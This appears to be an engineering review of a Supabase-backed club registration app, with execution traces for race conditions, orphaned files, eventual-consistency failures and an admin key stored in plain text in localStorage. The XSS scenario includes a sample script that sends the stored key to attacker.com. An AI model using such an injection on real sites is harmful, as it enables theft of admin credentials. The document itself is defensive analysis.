# Visual Execution Traces & State Diagrams

## ISSUE #1: ORPHANED FILES - EXECUTION TRACE

```
Admin clicks "Delete Collection ABC" (contains 50 registrations)
│
├─→ DELETE /api/registration-collections?id=col-abc
│   │
│   ├─→ withLock(async () => {
│   │   │
│   │   ├─→ listPaths("registrations/col-abc")
│   │   │   │
│   │   │   └─→ ❌ TIMEOUT (Supabase network issue)
│   │   │       Throws error
│   │   │
│   │   ├─→ CATCH block:
│   │   │   console.error('Error deleting registrations:', err)
│   │   │   // 🚨 CONTINUES EXECUTION HERE
│   │   │
│   │   ├─→ collections.splice(collectionIndex, 1)
│   │   │   // Collection removed from array
│   │   │
│   │   └─→ saveCollections(collections)
│   │       // Saved to Supabase
│   │
│   └─→ Response: "success: true" ✓
│
└─→ Admin sees: "Collection deleted successfully"

ACTUAL STATE:
  Server: ✓ Collection ABC deleted from settings/registration-collections.json
  Server: ✗ 50 files remain in registrations/col-abc/ (orphaned)
  Admin: Thinks deletion succeeded
  
COST: $0.18/month per 50 files × 12 months = $2.16
```

---

## ISSUE #2: APPROVAL CORRUPTION - STATE RACE

```
Two API Instances Process Same Registration

BEFORE:
  Supabase: { id: reg-123, status: pending, notes: "old" }

Instance-A (Approval)              Instance-B (Edit Notes)
──────────────────────────────────────────────────────────

T0: readJSONFromStorage(reg-123)
    → { status: pending, notes: "old" }

T1:                                readJSONFromStorage(reg-123)
                                   → { status: pending, notes: "old" }

T2: registration.status = "approved"
    registration.approvedAt = "2025-12-28T10:00:00Z"

T3:                                Object.assign(registration, {
                                     notes: "new"
                                   })

T4: writeJSONToStorage(path, registration)
    → Supabase: { status: approved, approvedAt: "2025-12-28T10:00:00Z", notes: "old" }
    ✓ Success

T5:                                writeJSONToStorage(path, registration)
                                   → Supabase: { status: pending, notes: "new" }
                                   ✓ Success
                                   
                                   🚨 OVERWRITES T4!

FINAL STATE IN SUPABASE:
  { id: reg-123, status: pending, notes: "new", approvedAt: GONE }
  
APPROVAL IS LOST!
```

---

## ISSUE #3: DISPLAY TOGGLE RACE - MULTI-TAB

```
Browser Tabs Concurrently Toggle Display

TAB-A                                    TAB-B
─────────────────────────────────────────────────────────────

T0: User checks "Display" for Col-A

T1:                                      User checks "Display" for Col-B

T2: setLocalPendingCollectionChanges({
      col-a: { display: true }
    })

T3:                                      setLocalPendingCollectionChanges({
                                           col-b: { display: true }
                                         })

T4: fetch(PATCH /registration-collections,
         { id: col-a, display: true })

T5:                                      fetch(PATCH /registration-collections,
                                               { id: col-b, display: true })

T6: Server receives PATCH col-a

T7: Lock acquired
    
T8: Read collections from Supabase:
    → [col-a { display: false }, col-b { display: false }]
    
T9: for (i = 0; i < collections.length; i++) {
      collections[i].display = (i === collectionIndex_a)
    }
    → [col-a { display: true }, col-b { display: false }]
    
T10: Write to Supabase
     ✓ Success

T11: Lock released

T12:                                     Lock acquired
     
T13: Read collections from Supabase:
     BUT TAB-B request was issued at T5!
     May read stale state: [col-a { display: false }, col-b { display: false }]
     
     OR if TAB-B read happens after TAB-A write, reads fresh state:
     → [col-a { display: true }, col-b { display: false }]
     
T14: for (i = 0; i < collections.length; i++) {
       collections[i].display = (i === collectionIndex_b)
     }
     → [col-a { display: false }, col-b { display: true }]
     
T15: Write to Supabase
     ✓ Success
     
     🚨 OVERWRITES COL-A!

FINAL STATE:
  col-a { display: false }  ← Back to false!
  col-b { display: true }

WHAT ADMIN SEES:
  Col-A: Unchecked (surprising!)
  Col-B: Checked (what they just clicked)
```

---

## ISSUE #4: COLLECTION NOT FOUND - EVENTUAL CONSISTENCY

```
Admin Creates Collection, User Submits Registration Within 100ms

T0: Admin clicks "Create Collection: Fall 2025"

T1: POST /registration-collections
    → writeJSONToStorage(settings/registration-collections.json, [
        { id: col-123, name: "Fall 2025", ... }
      ])
    → Supabase writes file
    ✓ Response: "success"

T2: Admin sees "Fall 2025" in collection list (optimistic update)

T3: Admin copies registration link:
    /register-club?collection=fall-2025

T4: Admin shares link to user (within 100ms of creation!)

T5: User submits registration form
    → POST /api/club-registration?collection=fall-2025

T6: Server starts retry loop:
    
    Attempt 1 (T6 + 0ms):
      readJSONFromStorage(settings/registration-collections.json)
      → Supabase might still be propagating!
      → Returns [] or old version
      → find(c => slugifyName("fall-2025") === "fall-2025") → undefined
      → Wait 200ms
    
    Attempt 2 (T6 + 200ms):
      readJSONFromStorage(settings/registration-collections.json)
      → Still propagating? 
      → Returns [] or old version
      → undefined
      → Wait 400ms
    
    Attempt 3 (T6 + 600ms):
      readJSONFromStorage(settings/registration-collections.json)
      → Supabase propagation complete!
      → Returns [{ id: col-123, name: "Fall 2025", ... }]
      → find() succeeds
      → Create registration ✓

WORST CASE:
  If Supabase takes 2+ seconds to propagate:
    Attempt 1 (0ms):   Not found
    Attempt 2 (200ms): Not found
    Attempt 3 (600ms): Not found
    
    → Retry loop exits
    → User sees: "Collection not found" ❌
    → User gets error message with no explanation

WHAT ADMIN DOESN'T KNOW:
  - Link is "not ready" yet
  - Should wait before sharing
  - How long to wait?
```

---

## ISSUE #5: ADMIN KEY PLAIN TEXT IN LOCALSTORAGE

```
Attack Scenarios

Scenario A: Shared Computer
──────────────────────────
User-A:
  1. Opens browser
  2. Navigates to /admin
  3. Logs in with password
  4. Enters admin API key → localStorage.setItem("analytics:adminKey", "secret-key-12345")
  5. Closes browser tab (doesn't logout)

User-B:
  1. Opens same browser (same profile)
  2. Opens DevTools Console
  3. Runs: localStorage.getItem("analytics:adminKey")
  4. Gets: "secret-key-12345"
  5. Can now:
     - Approve any registration
     - Deny any registration
     - Delete any registration
     - Modify collections
     - Clear data

Scenario B: XSS Attack
──────────────────────
Attacker injects JavaScript:
  <script>
    fetch("https://attacker.com/log?key=" + localStorage.getItem("analytics:adminKey"))
  </script>

  → Key sent to attacker's server
  → Attacker can impersonate admin

Scenario C: Browser History Leak
─────────────────────────────────
Browser history shows:
  DevTools input: [analytics:adminKey input field]
  
  Type in localStorage API:
  localStorage.setItem("analytics:admin...", [LEAKED IN HISTORY])

RISK SCORE: HIGH
```

---

## CORRECT ARCHITECTURE (What Should Happen)

```
APPROVED FLOW:

1️⃣ Collection Creation (Atomic)
   
   Admin creates "Fall 2025"
   │
   ├─→ Frontend validates:
   │   ✓ Name not empty
   │   ✓ Slug doesn't collision with existing
   │
   └─→ Server:
       ├─→ Lock collections
       ├─→ Verify no slug collision
       ├─→ Create collection
       ├─→ Verify write succeeded
       └─→ Unlock & respond
       
   ✓ Success: Link ready to share immediately

2️⃣ Registration Submission (Reliable)
   
   User submits registration
   │
   ├─→ Frontend generates idempotency key
   │
   └─→ Server:
       ├─→ Look up collection by slug
       ├─→ Lock registration file
       ├─→ Create registration
       ├─→ Verify write succeeded
       ├─→ Cache idempotency key
       └─→ Unlock & respond
       
   ✓ If request retried, idempotency prevents duplicate

3️⃣ Registration Approval (Serialized)
   
   Admin approves registration
   │
   └─→ Server:
       ├─→ Lock registration file
       ├─→ Read current state
       ├─→ Verify state hasn't changed
       ├─→ Set status = approved
       ├─→ Write back
       ├─→ Verify write succeeded
       ├─→ Invalidate cache
       └─→ Unlock & respond
       
   ✓ Concurrent updates are serialized
   ✓ State changes are atomic
   ✓ No lost approvals
```

---

## STATE MACHINE FOR REGISTRATION

```
Valid State Transitions:

        ┌─────────────┐
        │   pending   │
        └──────┬──────┘
               │
        ┌──────┴──────┐
        │             │
        ▼             ▼
    ┌──────────┐  ┌──────────┐
    │ approved │  │ rejected │
    └──────────┘  └──────────┘
        │             │
        └──────┬──────┘
               │
               ▼
          ┌─────────┐
          │ deleted │
          └─────────┘

Invalid Transitions (BUG):
  ✗ pending → pending (but update can reset this!)
  ✗ approved → pending (if update doesn't preserve status)
  ✗ rejected → approved (if approval doesn't check current state)
  ✗ deleted → any state (if file re-created)

CODE CURRENTLY ALLOWS:
  registration.status = "approved"  ← Blindly sets without checking
  Object.assign(registration, updates)  ← Blindly overwrites
  
SHOULD:
  if (registration.status !== "pending") {
    throw new Error("Cannot approve non-pending registration")
  }
```

---

## CACHE STRATEGY VISUALIZATION

```
Current (Broken) Strategy:

Instance-A             Instance-B
──────────            ──────────
  Cache:               Cache:
  [EMPTY]              [EMPTY]
  
  Approve Reg-123:
  ✓ Write succeeds
  registrationActionsCache.set({
    "registrations/col-1/reg-123.json": {
      status: "approved"
    }
  })
  
  Next request from Instance-B:
  User refreshes page
  GET /api/club-registration?collection=...
  
  Instance-B has no cache!
  Reads Supabase directly
  → Might see "pending" (eventual consistency)
  → User sees stale data


Fixed Strategy:

Instance-A             Instance-B
──────────            ──────────
  Approve Reg-123:
  ✓ Write succeeds
  ❌ DON'T cache
  ✅ Instead: Broadcast to all tabs
  
  Instance-B receives broadcast:
  "registrations:approve"
  → Invalidates local cache
  → Or doesn't cache at all
  
  Next request:
  GET /api/club-registration
  Instance-B reads fresh Supabase
  → Sees "approved"
  → Consistent view
```

---

## DEPLOYMENT RISK MATRIX

```
Risk vs Complexity vs Impact

PRIORITY 1 (Do ASAP):
  Issue #1 ████████████ (Easy + High Impact)
    Fix: Add validation after cleanup
    Time: 30 min
    Risk if not fixed: Data loss

  Issue #2 ████████████ (Easy + High Impact)
    Fix: Add registration locking
    Time: 1 hour
    Risk if not fixed: Concurrent corruption

  Issue #3 ██████ (Easy + Medium Impact)
    Fix: Remove cache
    Time: 15 min
    Risk if not fixed: Stale state

PRIORITY 2 (Do before production):
  Issue #4 ████████ (Medium + Medium Impact)
    Fix: Better error messages on collection not found
    Time: 30 min
    
  Issue #5 ████████ (Hard + Critical Impact)
    Fix: Don't persist API key
    Time: 2 hours
    
  Issue #6 ████ (Easy + Medium Impact)
    Fix: Fix display toggle logic
    Time: 45 min

PRIORITY 3 (Improve later):
  Issue #7 ██ (Easy + Low Impact)
    Fix: Input type changes
    Time: 15 min
    
  Issue #8 ████████ (Hard + Medium Impact)
    Fix: Rename flags
    Time: 3 hours

Risk Level If Not Fixed:
  All #1: 🔴 System broken
  All #2: 🔴 System broken
  All #3: 🟠 System unreliable
  All rest: 🟡 System confusing
```

